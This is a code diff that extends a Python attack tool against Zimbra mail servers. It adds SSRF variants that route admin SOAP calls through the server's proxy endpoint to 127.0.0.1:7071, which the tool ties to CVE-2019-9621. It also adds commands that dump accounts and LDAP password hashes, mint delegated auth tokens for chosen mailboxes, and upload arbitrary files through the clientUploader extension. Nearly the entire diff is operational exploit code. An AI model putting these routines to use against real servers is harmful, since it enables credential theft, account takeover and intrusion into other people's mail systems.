@@ -2,6 +2,7 @@
 import sys
 import requests
 import re
+from requests_toolbelt import MultipartEncoder
 import warnings
 warnings.filterwarnings("ignore")
 
@@ -144,7 +145,40 @@ def getalldomains_request(uri,token):
         print(r.text)
     except Exception as e:
         print("[!] Error:%s"%(e))
-    
+
+def getalldomains_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetAllDomainsRequest xmlns="urn:zimbraAdmin">
+         </GetAllDomainsRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+      print("[*] Try to get all domain names")
+      r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token),headers=headers,verify=False,timeout=15)
+      if "name" in r.text:
+        pattern_name = re.compile(r"zimbraDomainName\">(.*?)<")
+        name = pattern_name.findall(r.text)
+        for i in range(len(name)):       
+          print("[+] Domain name: %s"%(name[i]))
+      else:
+        print("[!]")
+        print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+
 def getallaccounts_request(uri,token):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
        <soap:Header>
@@ -161,6 +195,38 @@ def getallaccounts_request(uri,token):
     try:
         print("[*] Try to get all accounts")
         r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token),verify=False,timeout=15)
+        pattern_name = re.compile(r"name=\"(.*?)\"")
+        name = pattern_name.findall(r.text)
+        pattern_accountId = re.compile(r"id=\"(.*?)\"")
+        accountId = pattern_accountId.findall(r.text)     
+        for i in range(len(name)):
+          print("[+] Name:%s,Id:%s"%(name[i],accountId[i]))
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+        exit(0)
+
+def getallaccounts_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetAllAccountsRequest xmlns="urn:zimbraAdmin">
+         </GetAllAccountsRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to get all accounts")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token),headers=headers,verify=False,timeout=15)
         pattern_name = re.compile(r"name=\"(.*?)\"")
         name = pattern_name.findall(r.text)
         pattern_accountId = re.compile(r"id=\"(.*?)\"")
@@ -197,6 +263,38 @@ def getalladminaccounts_request(uri,token):
         print("[!] Error:%s"%(e))
         exit(0)
 
+def getalladminaccounts_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetAllAdminAccountsRequest xmlns="urn:zimbraAdmin">
+         </GetAllAdminAccountsRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to get all admin accounts")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token),headers=headers,verify=False,timeout=15)
+        pattern_name = re.compile(r"name=\"(.*?)\"")
+        name = pattern_name.findall(r.text)
+        pattern_accountId = re.compile(r"id=\"(.*?)\"")
+        accountId = pattern_accountId.findall(r.text)      
+        for i in range(len(name)):
+          print("[+] Admin name:%s,Id:%s"%(name[i],accountId[i]))
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+        exit(0)
+
 def getallmailboxes_request(uri,token):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
        <soap:Header>
@@ -213,6 +311,37 @@ def getallmailboxes_request(uri,token):
     try:
         print("[*] Try to get all mailboxes")
         r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token),verify=False,timeout=15)
+        pattern_accountId = re.compile(r"accountId=\"(.*?)\"")
+        accountId = pattern_accountId.findall(r.text)
+        for id in accountId:
+          print("[+] accountId:%s"%(id))
+
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+        exit(0)
+
+def getallmailboxes_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetAllMailboxesRequest xmlns="urn:zimbraAdmin">
+         </GetAllMailboxesRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to get all mailboxes")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token),headers=headers,verify=False,timeout=15)
         pattern_accountId = re.compile(r"accountId=\"(.*?)\"")
         accountId = pattern_accountId.findall(r.text)
         for id in accountId:
@@ -273,6 +402,39 @@ def getmemcachedconfig_request(uri,token):
         print("[!] Error:%s"%(e))
         exit(0)
 
+def getmemcachedconfig_requestSSRF(uri,token):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetMemcachedClientConfigRequest xmlns="urn:zimbraAdmin">
+         </GetMemcachedClientConfigRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to get memcached config")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token),headers=headers,verify=False,timeout=15)
+        if "serverList" in r.text:
+          pattern_config = re.compile(r"serverList=\"(.*?)\"")
+          config = pattern_config.findall(r.text)[0]
+          print("[+] ServerList: "+config)
+        else:
+          print("[!]")
+          print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+        exit(0)       
+
 def getldapentries_request(uri,token,query,ldapSearchBase):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
        <soap:Header>
@@ -291,6 +453,35 @@ def getldapentries_request(uri,token,query,ldapSearchBase):
     try:
         print("[*] Try to get LDAP Entries of %s"%(query))
         r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,query=query,ldapSearchBase=ldapSearchBase),verify=False,timeout=15)
+        print(r.text)
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+        exit(0)
+
+def getldapentries_requestSSRF(uri,token,query,ldapSearchBase):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetLDAPEntriesRequest xmlns="urn:zimbraAdmin">
+            <query>{query}</query>
+            <ldapSearchBase>{ldapSearchBase}</ldapSearchBase>
+         </GetLDAPEntriesRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to get LDAP Entries of %s"%(query))
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,query=query,ldapSearchBase=ldapSearchBase),headers=headers,verify=False,timeout=15)
         print(r.text)
     except Exception as e:
         print("[!] Error:%s"%(e))
@@ -330,6 +521,138 @@ def getalluserhash(uri,token,query,ldapSearchBase):
 
     except Exception as e:
         print("[!] Error:%s"%(e))
+        exit(0)
+
+def getalluserhashSSRF(uri,token,query,ldapSearchBase):
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <GetLDAPEntriesRequest xmlns="urn:zimbraAdmin">
+            <query>{query}</query>
+            <ldapSearchBase>{ldapSearchBase}</ldapSearchBase>
+         </GetLDAPEntriesRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to get all users' hash")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,query=query,ldapSearchBase=ldapSearchBase),headers=headers,verify=False,timeout=15)
+        if 'userPassword' in r.text:
+          pattern_data = re.compile(r"userPass(.*?)objectClass")
+          data = pattern_data.findall(r.text)   
+          for i in range(len(data)):
+              pattern_user = re.compile(r"mail\">(.*?)<")
+              user = pattern_user.findall(data[i])
+              pattern_password = re.compile(r"word\">(.*?)<")  
+              password = pattern_password.findall(data[i])  
+              print("[+] User:%s"%(user[0]))  
+              print("    Hash:%s"%(password[0]))
+        else:
+          print("[!]")
+          print(r.text)      
+
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+        exit(0)
+
+def gettoken_request(uri,token):
+    print("[*] Input the mailbox:")
+    mail = input("[>]: ")
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <DelegateAuthRequest xmlns="urn:zimbraAdmin">
+            <account by="name">{mail}</account>        
+         </DelegateAuthRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """    
+    try:
+        print("[*] Try to get the token")
+        r=requests.post(uri+":7071/service/admin/soap",data=request_body.format(token=token,mail=mail),verify=False,timeout=15)
+        if 'authToken' in r.text:
+            pattern_token = re.compile(r"<authToken>(.*?)</authToken>")
+            token = pattern_token.findall(r.text)
+            print("[+] authTOken:%s"%(token[0]))
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+        exit(0)
+
+def gettoken_requestSSRF(uri,token):
+    print("[*] Input the mailbox:")
+    mail = input("[>]: ")
+    request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+       <soap:Header>
+           <context xmlns="urn:zimbra">
+               <authToken>{token}</authToken>
+           </context>
+       </soap:Header>
+       <soap:Body>
+         <DelegateAuthRequest xmlns="urn:zimbraAdmin">
+            <account by="name">{mail}</account>        
+         </DelegateAuthRequest>
+       </soap:Body>
+    </soap:Envelope>
+    """
+    headers = {
+    "Content-Type":"application/xml"
+    }
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+    headers["Host"]="foo:7071"
+
+    try:
+        print("[*] Try to get the token")
+        r=requests.post(uri+"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap",data=request_body.format(token=token,mail=mail),headers=headers,verify=False,timeout=15)
+        if 'authToken' in r.text:
+            pattern_token = re.compile(r"<authToken>(.*?)</authToken>")
+            token = pattern_token.findall(r.text)
+            print("[+] authTOken:%s"%(token[0]))
+    except Exception as e:
+        print("[!] Error:%s"%(e))
+        exit(0)
+
+def upload_request(uri,token):
+    fileContent = 0;
+    path = input("[*] Input the path of the file:")
+    with open(path,'r') as f:
+        fileContent = f.read()
+    filename = path
+    print("[*] filepath:"+path)
+    print("[*] filedata:"+fileContent)
+
+    headers = {
+    "Content-Type":"application/xml"
+    }   
+    headers["Content-Type"]="multipart/form-data; boundary=----WebKitFormBoundary1abcdefghijklmno"
+    headers["Cookie"]="ZM_ADMIN_AUTH_TOKEN="+token+";"
+
+    m = MultipartEncoder(fields={
+    'filename1':(None,"test",None),
+    'clientFile':(filename,fileContent,"image/jpeg"),
+    'requestId':(None,"12345",None),
+    }, boundary = '----WebKitFormBoundary1abcdefghijklmno')
+
+    r = requests.post(uri+"/service/extension/clientUploader/upload",data=m,headers=headers,verify=False)
+    if 'window.parent._uploadManager.loaded(1,' in r.text:
+        print("[+] Upload Success!")
+        print("[+] URL:%s/downloads/%s"%(uri,filename))
+    else:
+        print("[!]")
+        print(r.text)  
         exit(0)
 
 def getalladdresslists_request(uri,token):
@@ -380,7 +703,6 @@ def getcontacts_request(uri,token,email):
         print("[!] Error:%s"%(e))
         exit(0)
 
-
 def getfolder_request(uri,token):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
        <soap:Header>
@@ -407,7 +729,6 @@ def getfolder_request(uri,token):
         print("[!] Error:%s"%(e))
         exit(0)
 
-
 def getitem_request(uri,token,path):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
        <soap:Header>
@@ -433,7 +754,6 @@ def getitem_request(uri,token,path):
     except Exception as e:
         print("[!] Error:%s"%(e))
         exit(0)
-
 
 def getmsg_request(uri,token,id):
     request_body="""<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
@@ -471,6 +791,7 @@ if __name__ == '__main__':
     print("      ssrf      Use CVE-2019-9621 to get the admin token")
     print("Eg:")
     print("      %s https://192.168.1.1 user1@mail.zimbra password low"%(sys.argv[0]))
+    print("      %s https://192.168.1.1 zimbra password ssrf"%(sys.argv[0]))    
     sys.exit(0)
   else:
     if sys.argv[4]=='low':
@@ -486,7 +807,7 @@ if __name__ == '__main__':
       print("      help")
       print("      exit")
       while(1):
-        cmd = raw_input("[$] ")
+        cmd = input("[$] ")
         if cmd=='help':
           print("Supprot command:")
           print("      GetAllAddressLists")
@@ -523,12 +844,14 @@ if __name__ == '__main__':
       print("      GetAllAccounts")
       print("      GetAllAdminAccounts")
       print("      GetMemcachedClientConfig")
-      print("      GetLDAPEntries <query> <ldapSearchBase>,Eg:GetLDAPEntries cn=* dc=zimbra,dc=com")
-      print("      getalluserhash <ldapSearchBase>,Eg:getalluserhash dc=zimbra,dc=com")
+      print("      GetLDAPEntries")
+      print("      GetToken")      
+      print("      getalluserhash")
+      print("      upload")
       print("      help")
       print("      exit")
       while(1):
-        cmd = raw_input("[$] ")
+        cmd = input("[$] ")
         if cmd=='help':
           print("Supprot command:")
           print("      GetAllDomains")
@@ -536,8 +859,10 @@ if __name__ == '__main__':
           print("      GetAllAccounts")
           print("      GetAllAdminAccounts")
           print("      GetMemcachedClientConfig")
-          print("      GetLDAPEntries <query> <ldapSearchBase>,Eg:GetLDAPEntries cn=* dc=zimbra,dc=com")
-          print("      getalluserhash <ldapSearchBase>,Eg:getalluserhash dc=zimbra,dc=com")
+          print("      GetLDAPEntries")
+          print("      GetToken")      
+          print("      getalluserhash")
+          print("      upload")
           print("      help")
           print("      exit")         
         elif cmd=='GetAllDomains':          
@@ -550,12 +875,26 @@ if __name__ == '__main__':
           getalladminaccounts_request(sys.argv[1],admin_token)
         elif cmd=='GetMemcachedClientConfig':
           getmemcachedconfig_request(sys.argv[1],admin_token)
-        elif 'GetLDAPEntries' in cmd:
-          cmdlist = cmd.split(' ')
-          getldapentries_request(sys.argv[1],admin_token,cmdlist[1],cmdlist[2])
-        elif 'getalluserhash' in cmd:
-          cmdlist = cmd.split(' ')
-          getalluserhash(sys.argv[1],admin_token,"cn=*",cmdlist[1])   
+        elif cmd=='GetLDAPEntries':
+          print("[*] Input the ldapSearchBase1:")
+          print("Eg.")
+          print("cn=*")
+          ldapSearchBase1 = input("[>]:")
+          print("[*] Input the ldapSearchBase2:")
+          print("Eg.")
+          print("dc=zimbra,dc=com")
+          ldapSearchBase2 = input("[>]:")
+          getldapentries_request(sys.argv[1],admin_token,ldapSearchBase1,ldapSearchBase2)
+        elif cmd=='getalluserhash':
+          print("[*] Input the ldapSearchBase:")
+          print("Eg.")
+          print("dc=zimbra,dc=com")
+          ldapSearchBase = input("[>]:")          
+          getalluserhash(sys.argv[1],admin_token,"cn=*",ldapSearchBase)
+        elif cmd=='GetToken':
+          gettoken_request(sys.argv[1],admin_token)
+        elif cmd=='upload':
+          upload_request(sys.argv[1],admin_token)            
         elif cmd=='exit':
           exit(0)
         else:
@@ -571,12 +910,22 @@ if __name__ == '__main__':
       print("      GetAllAccounts")
       print("      GetAllAdminAccounts")
       print("      GetMemcachedClientConfig")
-      print("      GetLDAPEntries <query> <ldapSearchBase>,Eg:GetLDAPEntries cn=* dc=zimbra,dc=com")
-      print("      getalluserhash <ldapSearchBase>,Eg:getalluserhash dc=zimbra,dc=com")
+      print("      GetLDAPEntries")
+      print("      GetToken")      
+      print("      getalluserhash")
+      print("      upload")
+      print("      GetAllDomainsSSRF")
+      print("      GetAllMailboxesSSRF")
+      print("      GetAllAccountsSSRF")
+      print("      GetAllAdminAccountsSSRF")
+      print("      GetMemcachedClientConfigSSRF")
+      print("      GetLDAPEntriesSSRF")
+      print("      GetTokenSSRF")      
+      print("      getalluserhashSSRF")
       print("      help")
       print("      exit")
       while(1):
-        cmd = raw_input("[$] ")
+        cmd = input("[$] ")
         if cmd=='help':
           print("Supprot command:")
           print("      GetAllDomains")
@@ -584,8 +933,18 @@ if __name__ == '__main__':
           print("      GetAllAccounts")
           print("      GetAllAdminAccounts")
           print("      GetMemcachedClientConfig")
-          print("      GetLDAPEntries <query> <ldapSearchBase>,Eg:GetLDAPEntries cn=* dc=zimbra,dc=com")
-          print("      getalluserhash <ldapSearchBase>,Eg:getalluserhash dc=zimbra,dc=com")
+          print("      GetLDAPEntries")
+          print("      GetToken")      
+          print("      getalluserhash")
+          print("      upload")
+          print("      GetAllDomainsSSRF")
+          print("      GetAllMailboxesSSRF")
+          print("      GetAllAccountsSSRF")
+          print("      GetAllAdminAccountsSSRF")
+          print("      GetMemcachedClientConfigSSRF")
+          print("      GetLDAPEntriesSSRF")
+          print("      GetTokenSSRF")      
+          print("      getalluserhashSSRF")          
           print("      help")
           print("      exit")
         elif cmd=='GetAllDomains':          
@@ -598,12 +957,54 @@ if __name__ == '__main__':
           getalladminaccounts_request(sys.argv[1],admin_token)
         elif cmd=='GetMemcachedClientConfig':
           getmemcachedconfig_request(sys.argv[1],admin_token)
-        elif 'GetLDAPEntries' in cmd:
-          cmdlist = cmd.split(' ')
-          getldapentries_request(sys.argv[1],admin_token,cmdlist[1],cmdlist[2])
-        elif 'getalluserhash' in cmd:
-          cmdlist = cmd.split(' ')
-          getalluserhash(sys.argv[1],admin_token,"cn=*",cmdlist[1])   
+        elif cmd=='GetLDAPEntries':
+          print("[*] Input the ldapSearchBase1:")
+          print("Eg.")
+          print("cn=*")
+          ldapSearchBase1 = input("[>]:")
+          print("[*] Input the ldapSearchBase2:")
+          print("Eg.")
+          print("dc=zimbra,dc=com")
+          ldapSearchBase2 = input("[>]:")
+          getldapentries_request(sys.argv[1],admin_token,ldapSearchBase1,ldapSearchBase2)
+        elif cmd=='getalluserhash':
+          print("[*] Input the ldapSearchBase:")
+          print("Eg.")
+          print("dc=zimbra,dc=com")
+          ldapSearchBase = input("[>]:")          
+          getalluserhash(sys.argv[1],admin_token,"cn=*",ldapSearchBase)
+        elif cmd=='GetToken':
+          gettoken_request(sys.argv[1],admin_token)
+        elif cmd=='upload':
+          upload_request(sys.argv[1],admin_token)
+        elif cmd=='GetAllDomainsSSRF':          
+          getalldomains_requestSSRF(sys.argv[1],admin_token)
+        elif cmd=='GetAllMailboxesSSRF':
+          getallmailboxes_requestSSRF(sys.argv[1],admin_token)
+        elif cmd=='GetAllAccountsSSRF':
+          getallaccounts_requestSSRF(sys.argv[1],admin_token)
+        elif cmd=='GetAllAdminAccountsSSRF':
+          getalladminaccounts_requestSSRF(sys.argv[1],admin_token)
+        elif cmd=='GetMemcachedClientConfigSSRF':
+          getmemcachedconfig_requestSSRF(sys.argv[1],admin_token)
+        elif cmd=='GetLDAPEntriesSSRF':
+          print("[*] Input the ldapSearchBase1:")
+          print("Eg.")
+          print("cn=*")
+          ldapSearchBase1 = input("[>]:")
+          print("[*] Input the ldapSearchBase2:")
+          print("Eg.")
+          print("dc=zimbra,dc=com")
+          ldapSearchBase2 = input("[>]:")
+          getldapentries_requestSSRF(sys.argv[1],admin_token,ldapSearchBase1,ldapSearchBase2)
+        elif cmd=='getalluserhashSSRF':
+          print("[*] Input the ldapSearchBase:")
+          print("Eg.")
+          print("dc=zimbra,dc=com")
+          ldapSearchBase = input("[>]:")          
+          getalluserhashSSRF(sys.argv[1],admin_token,"cn=*",ldapSearchBase)
+        elif cmd=='GetTokenSSRF':
+          gettoken_requestSSRF(sys.argv[1],admin_token)
         elif cmd=='exit':
           exit(0)
         else:
